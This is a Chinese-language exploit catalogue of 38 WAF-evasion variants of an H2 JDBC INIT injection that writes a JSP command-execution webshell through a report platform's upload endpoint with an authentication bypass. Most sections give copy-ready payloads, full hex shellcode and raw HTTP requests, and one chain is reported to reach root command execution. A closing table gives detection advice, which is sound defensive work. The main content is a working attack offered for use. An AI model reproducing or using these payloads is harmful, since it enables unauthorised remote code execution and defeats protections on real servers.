# WAF 规避变体全集（38 个，全部对 11.5.15 靶场实弹验证）

> 阅读方法：每个变体给出**可直接复制使用的完整载荷原文**与（如涉及）完整请求差异，
> 并解释它为什么能过/为什么死。所有变体共用同一个 96 字节 JSP 马与同一个注入位置。
>
> 判定标准：变体完成 上传 → apply → `GET /<jsp>?c=echo+ok` 全链，
> 返回 HTTP 200 且响应体为 `0`（= 文件写入 + Tomcat 编译 + 命令执行三件事全部成立）记 **★有效**，
> 否则 **✗无效** 并给出服务器侧实测死因。

## 0. 公共部件（所有变体共用，后文直接引用）

### JSP 木马（96 字节，写入目标后由 `GET /<文件>?c=<命令>` 触发）

```
<%=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")}).waitFor()%>
```

### JSP_HEX（上面 96 字节的十六进制编码，192 个字符，即 SQL 里 `X'...'` 的内容）

```
3C253D52756E74696D652E67657452756E74696D6528292E65786563286E657720537472696E675B5D7B222F62696E2F7368222C222D63222C726571756573742E676574506172616D6574657228226322297D292E77616974466F722829253E
```

### 注入原理一句话

上传接口的 `props` 参数是一个 JSON，其中 `name` 字段会成为 H2 数据库临时目录名，
并最终拼进 JDBC URL：

```
jdbc:h2:<WEB-INF>/assets/reuse/import_temp_dir/<name 去掉尾部> ;USER=sa;MODE=MYSQL;...
                                                 ^^^^^^^^
name 里写 x;INIT=CALL FILE_WRITE(...)-- 后，;INIT= 成了 H2 的连接设置，
-- 注释吃掉 URL 尾部自动拼接的 /appdata 垃圾，CALL FILE_WRITE 在连接建立时执行。
```

### 基础请求形状（所有变体都在此基础上改）

```
POST /webroot/decision/view/duchamp/reuse/item?tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props=<URL编码后的JSON>
Content-Type: multipart/form-data; boundary=----poc114516

------poc114516
Content-Disposition: form-data; name="file"; filename="p.mfvs"
Content-Type: application/octet-stream

<复用包 ZIP 二进制>
------poc114516--
```

其中 props 未编码时的 JSON 明文为（name 值即各变体的注入串）：

```json
{"name": "<注入串>", "structureVersion": "2.0", "envVersion": "11.0"}
```

---

# 第一部分：基础层变体（字符级混淆）

## A 组 —— 注入串本身的变形（15 个）

### A1 基线 ★有效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52756E74696D652E67657452756E74696D6528292E65786563286E657720537472696E675B5D7B222F62696E2F7368222C222D63222C726571756573742E676574506172616D6574657228226322297D292E77616974466F722829253E', '/usr/local/tomcat/webapps/ROOT/A1.jsp')--
```

说明：`x` 是目录名前缀；`;INIT=` 开启 H2 连接设置；`CALL FILE_WRITE(十六进制内容, 绝对路径)` 是 H2 内置的写文件函数；结尾 `--` 是 SQL 行注释，用于吃掉 URL 尾部自动拼上来的 `/appdata`，否则语句报语法错。

### A2 全小写 ★有效

完整 name 值：

```
x;init=call file_write(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A2.jsp')--
```

（`X'...'` 内 192 个十六进制字符与第 0 节 JSP_HEX 完全相同，下同，不再重复罗列）

有效原因：H2 连接 URL 的**设置键名不区分大小写**（`init=` 与 `INIT=` 等价），SQL 关键字与函数名也不区分大小写。WAF 视角：任何大小写敏感的签名（`INIT=`、`FILE_WRITE`）直接失配。

### A3 随机大小写 ★有效

完整 name 值：

```
x;InIt=cAlL FiLe_Write(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A3.jsp')--
```

有效原因：同 A2。FiLe_Write 这种混合大小写能穿过大量 `(?i)` 关闭的正则与精确匹配规则。

### A4 函数与括号之间插入注释 ★有效

完整 name 值：

```
x;INIT=CALL /*q*/ FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A4.jsp')--
```

有效原因：SQL 词法分析器把 `/*q*/` 当空白，`CALL  FILE_WRITE(` 与 `CALL FILE_WRITE(` 等价。WAF 若用连续子串匹配 `CALL FILE_WRITE` 即被注释打断。

### A16 函数名与括号之间加空格 ★有效

完整 name 值：

```
x;INIT=CALL FILE_WRITE (X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A16.jsp')--
```

有效原因：`FILE_WRITE (` 中间的空格对 SQL 解析无影响。签名 `FILE_WRITE(` 失配。

### A17 参数内部插注释 ★有效

完整 name 值：

```
x;INIT=CALL FILE_WRITE (/*z*/X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A17.jsp')--
```

有效原因：注释可出现在任何 token 之间，包括左括号后。同时打断 `WRITE(X'` 与 `(X'` 两类签名。

### A8 十六进制切块拼接 ★有效

完整 name 值（192 字符 hex 从正中间切开，两段之间用 `||` 连接）：

```
x;INIT=CALL FILE_WRITE(X'3C253D52756E74696D652E67657452756E74696D6528292E65786563286E657720537472696E675B5D7B222F62696E2F'||X'7368222C222D63222C726571756573742E676574506172616D6574657228226322297D292E77616974466F722829253E', '/usr/local/tomcat/webapps/ROOT/A8.jsp')--
```

有效原因：H2 中两个二进制字面量 `X'..'||X'..'` 求值为拼接后的同一字节串，FILE_WRITE 收到的内容不变；但"长串连续十六进制"特征被打断（每段只剩 96 字符）。

### A9 路径加 `./` 噪声 ★有效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/./A9.jsp')--
```

有效原因：文件系统把 `/ROOT/./A9.jsp` 规范化为 `/ROOT/A9.jsp`。签名 `ROOT/A9.jsp`、`/ROOT/[^/.]` 之类被 `./` 打断。

### A11 路径全部双斜杠 ★有效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', '//usr//local//tomcat//webapps//ROOT//A11.jsp')--
```

有效原因：多个连续斜杠在路径规范化时折叠为一个。`/usr/local/tomcat` 明文签名完全消失。

### A12 INIT 前面先塞一个无害设置 ★有效

完整 name 值：

```
x;QUERY_TIMEOUT=0;INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A12.jsp')--
```

有效原因：`;` 分隔的 H2 连接设置可以任意多个，`QUERY_TIMEOUT=0` 是合法无害设置（注意不能用默认设置串里已有的键如 USER/WRITE_DELAY，否则报 Duplicate property）。WAF 视角：`;INIT=` 变成了 `0;INIT=`，紧跟着分号的 `INIT` 签名形态改变。

### A5 用 `#` 注释吃尾部垃圾 ✗无效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A5.jsp')#
```

死因（实测）：这个 H2 2.2.224 版本即使开了 MODE=MYSQL 也不支持 `#` 注释，语句在 `#` 处语法报错，文件未写入。只能用 `--`。

### A6 用不闭合的 `/*` 吃尾部垃圾 ✗无效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A6.jsp')/*
```

死因（实测）：块注释没有闭合，SQL 解析器直接报错。块注释必须 `/*...*/` 成对出现。

### A7 路径也全部 hex 化（RAWTOCHAR）✗无效

完整 name 值（`2F7573722F...` 是 `/usr/local/tomcat/webapps/ROOT/` 的 hex）：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', RAWTOCHAR(X'2F7573722F6C6F63616C2F746F6D6361742F776562617070732F524F4F542F41372E6A7370'))--
```

死因（实测）：FILE_WRITE 第二参数要求 VARCHAR 类型，RAWTOCHAR 返回的是二进制类型，类型不匹配导致写失败。想要"路径无明文"用 A11 双斜杠 + 后述 X3 的 CHAR 拼接组合替代。

### A10 路径里用 `../` 回绕 ✗无效

完整 name 值：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/../ROOT/A10.jsp')--
```

死因（实测）：**上传阶段就被拒**——name 会先被当作存储目录名建目录，含 `..` 段的 name 在资源写入层直接被拒，接口不返回 id。`./`（A9）能过是因为它不构成目录逃逸。

### A13 设置键前加空格 ✗无效

完整 name 值：

```
x; INIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/A13.jsp')--
```

死因（实测）：H2 的 URL 设置解析按 `;` 切分后**不 trim 键名**，` INIT` 不是合法设置键，整条 INIT 被忽略。分号后不能有空格。

## B 组 —— 参数位置与参数污染（4 个）

### B1 参数污染：载荷在前，干净参数在后 ★有效

完整 query string（注意有两个 props，**第一个是攻击 JSON，第二个是正常 JSON**）：

```
tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props=%7B%22name%22%3A%20%22x%3BINIT%3DCALL%20FILE_WRITE%28X%273C25...253E%27%2C%20%27%2Fusr%2Flocal%2Ftomcat%2Fwebapps%2FROOT%2FB1.jsp%27%29--%22%2C%20%22structureVersion%22%3A%20%222.0%22%2C%20%22envVersion%22%3A%20%2211.0%22%7D&props=%7B%22name%22%3A%20%22b%22%2C%20%22structureVersion%22%3A%20%222.0%22%2C%20%22envVersion%22%3A%20%2211.0%22%7D
```

有效原因：**服务器按 Servlet 规范取第一个值**（攻击载荷生效）。部分 WAF 对重复参数做"取最后一个"或"合并去重"处理，只检查到干净的第二个——语义错位即绕过。

### B2 参数污染反序：干净在前，载荷在后 ✗无效

```
...&props=<干净的JSON>&props=<攻击JSON>
```

死因（实测）：服务器读第一个（干净的），攻击 JSON 被完全忽略，无文件写入。与 B1 合起来证明了服务器的取值语义是"第一个"——B1 能过、B2 不能过。

### B3 把 props 挪进 multipart 表单字段 ✗无效

请求形状（props 从 query 挪到 multipart body 里的普通字段）：

```
POST /webroot/decision/view/duchamp/reuse/item?tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D
Content-Type: multipart/form-data; boundary=----x

----x
Content-Disposition: form-data; name="props"

{"name": "x;INIT=CALL FILE_WRITE(...)--", "structureVersion": "2.0", "envVersion": "11.0"}
----x
Content-Disposition: form-data; name="file"; filename="p.mfvs"
...(ZIP)
----x--
```

死因（实测）：该接口用 getParameter 读 props，只解析 query string 和 urlencoded body，**不解析 multipart 文本字段**——上传返回 200 但无 id。

### B4 双重编码 `%3B` ✗无效

name 值（注意分号是字面量 `%3B` 三个字符，不是真分号）：

```
x%3BINIT=CALL FILE_WRITE(X'3C253D52...253E', '/usr/local/tomcat/webapps/ROOT/B4.jsp')--
```

死因（实测）：整条链路对参数只做**一次** URL 解码。`%3B` 作为字面三个字符留在目录名里，不构成 H2 设置分隔符，INIT 从未生效。证明双重编码在此无路。

## C 组 —— 路由形态（4 个）

基线路由：`/webroot/decision/view/duchamp/reuse/item`

### C2 路由尾加斜杠 ★有效

```
POST /webroot/decision/view/duchamp/reuse/item/?tplPath=reportlets&...
```

有效原因：Tomcat 默认开启路径映射的尾斜杠等价（*/item 与 /item/ 映射同一 servlet）。

### C3 路由段尾加分号路径参数 ★有效

```
POST /webroot/decision/view/duchamp/reuse/item;a=b?tplPath=reportlets&...
```

有效原因：Tomcat 做 servlet 映射前会剥离每段里 `;` 后的路径参数，`item;a=b` 映射到 `item`。规则若按原始 URI 精确匹配 `/reuse/item` 即失配。

### C5 各段内双斜杠 ★有效

```
POST /webroot/decision//view//duchamp//reuse//item?tplPath=reportlets&...
```

有效原因：URI 规范化折叠连续斜杠后映射不变。

### C4 路由大小写变换 ✗无效

```
POST /webroot/decision/view/duchamp/Reuse/Item?...
```

死因（实测）：Servlet 路由匹配**大小写敏感**，404。与 Express 等不敏感框架相反——这类变体要先摸清中间件。

## D 组 —— 鉴权绕过参数 tplPath 的变形（5 个）

基线：`?tplPath=reportlets`（正是它被归一化成空值才绕过登录校验）。

### D1 首字母百分号编码 ★有效

```
?tplPath=%72eportlets&...
```

有效原因：传输层 URL 解码后就是 `reportlets`，服务端语义不变；而明文签名 `tplPath=reportlets` 从原始流量里消失。

### D3 尾斜杠 ★有效

```
?tplPath=reportlets/&...
```

有效原因：归一化剥前缀后剩下空串，绕过条件（"路径归一化为空值"）依然成立——这从侧面证实了漏洞根因是"空值放行"而非"精确前缀匹配"。

### D2 全大写 ✗无效

```
?tplPath=REPORTLETS&...
```

死因（实测）：前缀比较**大小写敏感**，`REPORTLETS` 不被剥离，非空路径走登录校验 → 未登录被拒。

### D4 加 `./` 前缀 ✗无效

```
?tplPath=./reportlets&...
```

死因（实测）：`./reportlets` 与剥前缀逻辑不匹配，路径非空 → 登录校验 → 拒绝。

### D5 自回绕 ✗无效

```
?tplPath=reportlets/../reportlets&...
```

死因（实测）：前缀剥离后剩余 `../reportlets` 非空 → 登录校验 → 拒绝。

---

# 第二部分：高级层变体（结构性规避，10+2 个）

> 这一层针对"基础字符混淆已被规则防死"的场景，打的是规则引擎的**结构性盲区**：
> 解码深度错位、运行期求值、传输层形态。

## X1 JSON `\u` 转义——部分转义 ★有效

props 的 JSON 明文（name 值里只有敏感字符 `; ' ( ) 空格 = /` 被转义，其余明文）：

```json
{"name": "x\u003bINIT\u003dCALL\u0020FILE\u005fWRITE\u0028X'3C253D52...253E'\u002c\u0020'/usr/local/tomcat/webapps/ROOT/x1.jsp'\u0029--", "structureVersion": "2.0", "envVersion": "11.0"}
```

原理（**解码深度错位**）：WAF 通常只对参数做 URL 解码，**不做 JSON 字符串反转义**；而服务端的 JSON 解析器会把 `\u003b` 还原成 `;`。于是 `;INIT=`、`CALL FILE_WRITE(`、路径、括号全部从流量里消失，载荷在应用层"复活"。实测引擎日志中落盘目录名是**还原后的明文载荷**，证明转义被服务端完整解码。

## X2 JSON `\u` 转义——全转义 ★有效（推荐主力形态）

props 的 JSON 明文（name 值**每一个字符**都转义，示例给开头一段）：

```json
{"name": "\u0078\u003b\u0049\u004e\u0049\u0054\u003d\u0043\u0041\u004c\u004c\u0020\u0046\u0049\u004c\u0045\u005f\u0057\u0052\u0049\u0054\u0045\u0028\u0058\u0027\u0033\u0043\u0032\u0035...", "structureVersion": "2.0", "envVersion": "11.0"}
```

原理：同 X1，但流量里连 `INIT`、`CALL`、hex 明文都不存在——对参数值做任何明文签名的 WAF 全盲。
（这也是为什么第 0 节的"基线"在有 WAF 场景下不应直接使用。）

## X3 CONCAT+CHAR 运行期拼出 `.jsp` 后缀 ★有效

完整 name 值（文件名只有主名 `q`，`.jsp` 四个字符由数据库内 CHAR() 求值拼出）：

```
x;INIT=CALL FILE_WRITE(X'3C253D52...253E', concat('/usr/local/tomcat/webapps/ROOT/q', char(46),char(106),char(115),char(112)))--
```

原理：FILE_WRITE 的参数是 SQL 表达式，服务端求值后才是真路径。46/106/115/112 是 `.`/`j`/`s`/`p` 的 ASCII。**流量里不存在 `.jsp` 明文**——针对写马动作"目标以 .jsp 结尾"这类签名彻底失效。
两个实测坑：H2 的 `CHAR()` 只接受**单个参数**（`CHAR(46,106,115,112)` 多参是 MySQL 方言，报语法错）；字符串之间别用 `||`（MODE=MYSQL 下语义漂移导致求值错误），要用 `CONCAT()`。

## X4 X3 + 小写 + 注释编织 ★有效

完整 name 值：

```
x;init=call /*a*/file_write(X'3C253D52...253E', concat(/*b*/'/usr/local/tomcat/webapps/ROOT/q'/*c*/, char(46),char(106),char(115),char(112)))--
```

原理：X3 的运行期拼接 × A2 小写 × A4/A17 注释三维度叠加，各维度正交。

## X8 十六进制切 8 块 + 注释交错 ★有效

完整 name 值（192 字符 hex 切成 8 段，每段 24 字符，段间注释+拼接）：

```
x;INIT=CALL FILE_WRITE(/*z*/X'3C253D52756E74696D652E67'||X'657452756E74696D6528292E'||X'65786563286E657720537472'||X'696E675B5D7B222F62696E2F'||X'7368222C222D63222C726571'||X'756573742E67657450617261'||X'6D6574657228226322297D29'||X'2E77616974466F722829253E', '/usr/local/tomcat/webapps/ROOT/x8.jsp')--
```

原理：杀"连续长十六进制串"签名（某些规则用 `[0-9A-Fa-f]{100,}` 检测编码载荷）。每段仅 24 字符，且中间夹注释与拼接符。注意二进制 `X'..'||X'..'` 拼接实测可用（与字符串 `||` 的坑不同）。

## X5 apply 参数挪进 POST body ★有效

第二步 apply 请求从 query 挪到表单体：

```
POST /webroot/decision/view/duchamp/reuse/apply/v2/tpl
Content-Type: application/x-www-form-urlencoded

tplPath=reportlets&id=<上传返回的uuid>&path=xout
```

原理：`id`、`path`、`tplPath` 全部离开 query string。只检测 URL 的规则在第二步完全失明；两步合看才能拼出完整攻击叙事。

## X6 绝对 URI 请求行（absolute-form）★有效

上传请求的请求行不再是 origin-form，而是：

```
POST http://目标:18081/webroot/decision/view/duchamp/reuse/item?tplPath=reportlets&... HTTP/1.1
```

原理：RFC 7230 允许代理场景的 absolute-form，Tomcat 原样接受并取其 path 部分。部分设备/中间件对 absolute-form 不做内容检测或解析错位。（Python 里 `http.client` 直接把完整 URL 放进请求行即可实现；curl 用 `--request-target`。）

## X9 路由段百分号编码 ★有效

上传请求行（`view` 的 v 和 `item` 的 i 被编码）：

```
POST /webroot/decision/v%69ew/duchamp/reuse/%69tem?tplPath=reportlets&... HTTP/1.1
```

原理：Tomcat 对 URI **先解码再做 servlet 映射**，`v%69ew/.../%69tem` 映射结果与明文完全一致；而流量里不存在 `/view/duchamp/reuse/item` 明文路由。与 D1 同理但作用于整条路径。

## X7 把 name 藏进包内 info.xml（props 不带 name）✗无效

构造：复用包 `resource/info.xml` 的 `<name>` 写注入串，props JSON 只带 `{"structureVersion":"2.0","envVersion":"11.0"}`（不带 name 键）。

死因（实测）：上传接口直接报错 `errorCode 21300015`——props.name 是必填项，服务端**不会**回退去读包内 info.xml 的 name（正常流程是 props.name 反向覆写包内 name）。"载荷进 ZIP 内部让 WAF 完全看不见"这条路在 4.13.0 上不通。

## X11 终极形态（载荷级全叠加）★有效

name 值的**明文**（实际投放时整条再套 X2 的 `\u` 全转义）：

```
x;init=call /*a*/file_write(X'3C253D52756E74696D652E67'||X'657452756E74696D6528292E'||X'65786563286E657720537472'||X'696E675B5D7B222F62696E2F'||X'7368222C222D63222C726571'||X'756573742E67657450617261'||X'6D6574657228226322297D29'||X'2E77616974466F722829253E', concat(/*b*/'/usr/local/tomcat/webapps/ROOT/z', char(46),char(106),char(115),char(112)))--
```

组合：小写 + 注释 + hex 切 8 块 + CHAR 拼后缀（无 .jsp 明文）。单独验证通过。

## X12 X11 + 传输层全叠加 ★有效（端到端实测 uid=0）

在 X11（外套 \u 全转义）之上，再叠加传输层三件套：

```
请求行(absolute-form + 路由编码):
POST http://目标:18081/webroot/decision/v%69ew/duchamp/reuse/%69tem?tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props=%7B%22name%22%3A%20%22%5C%75%30%30%37%38%5C%75%30%30%33%62...%22...%7D HTTP/1.1

(props 的 name 值全部为 \u00xx 转义, 明文载荷零字节)

第二步 apply:
POST /webroot/decision/view/duchamp/reuse/apply/v2/tpl
Content-Type: application/x-www-form-urlencoded
Body: tplPath=reportlets&id=<uuid>&path=xout
```

实测：四步全链（上传/apply/触发/回读）通过，`id` 输出 `uid=0(root)`。
`poc-h2.py --shape stealth` 即此形态的自动化实现。

---

# 第三部分：给检测侧的逐条封堵建议

| # | 威胁面（对应变体） | 必须做到的检测处理 |
|---|---|---|
| 1 | X1/X2 `\u` 转义 | 对 JSON 类参数（props）：URL 解码 → **JSON parse → 取 name 字段值** → 再做签名匹配。不做 JSON 反转义的规则在此面全盲 |
| 2 | A2/A3 大小写、A4/A16/A17 注释与空白 | 匹配前做 SQL 归一化：剥 `/*..*/`、折叠空白、统一小写；`\binit\s*=`（不区分大小写） |
| 3 | A8/X8 hex 切块 | 不要依赖"连续长 hex"签名；改为在归一化后检测 `X'[0-9A-Fa-f]+'` 出现次数≥2 且总长超阈值 |
| 4 | X3/X4 CHAR 拼后缀 | 对 `concat(`、`char([0-9]+)` 链做求值还原后再判断路径是否以可执行后缀结尾 |
| 5 | A9/A11 路径噪声 | 路径规范化（折叠 `//`、消 `./`）后再匹配 `webapps`、`WEB-INF` 等 |
| 6 | C2/C3/C5/X9 路由 | 路由归一化：URL 解码两次 → 剥 `;k=v` 路径参数 → 折叠多斜杠/尾斜杠 → 再匹配路由表 |
| 7 | D1/D3 鉴权参数 | tplPath 比较用解码后值 + 前缀剥离后判空（`reportlets/` 也是空） |
| 8 | B1 参数污染 | 重复参数取**第一个**（与服务器语义一致），并拒绝"同名参数出现多次且值不一致"的请求 |
| 9 | X5 body 参数 | query 与 urlencoded body 都要检测 |
| 10 | X6 absolute-form | 请求行目标 URI 必须归一化（剥 scheme://host:port）后再进检测管线 |
| 11 | 纵深（最可靠） | 注入真正生效点在 JDBC 层：对引擎日志 `exampleDB test connection failed, path:jdbc:h2:` 中含 `INIT=` 的 URL 做告警；`FILE_WRITE` 目标目录做系统级监控（auditd）；JSP-Monitor 覆盖全部 webapps；应用进程降权 |
